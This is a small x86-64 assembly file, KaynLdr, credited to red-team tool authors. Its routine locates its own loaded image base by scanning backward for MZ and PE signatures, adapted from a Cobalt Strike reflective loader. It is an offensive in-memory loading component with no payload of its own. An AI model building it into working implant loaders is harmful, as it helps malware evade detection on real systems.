; KaynLdr
; Author: Paul Ungur (@C5pider)
; Credits: Austin Hudson (@ilove2pwn_), Chetan Nayak (@NinjaParanoid), Bobby Cooke (@0xBoku), @trickster012
;

global KaynCaller

section .text

   ; Shameless copied from Bobby Cooke CobaltStrikeReflectiveLoader (https://github.com/boku7/CobaltStrikeReflectiveLoader)
   KaynCaller:
       call pop
       pop:
       pop rcx                  
   loop:
       xor rbx, rbx
       mov ebx, 0x5A4D
       dec rcx
       cmp bx,  word ds:[ rcx ]
       jne loop
       xor rax, rax
       mov ax,  [ rcx + 0x3C ]
       add rax, rcx
       xor rbx, rbx
       add bx,  0x4550
       cmp bx,  word ds:[ rax ]
       jne loop
       mov rax, rcx
   ret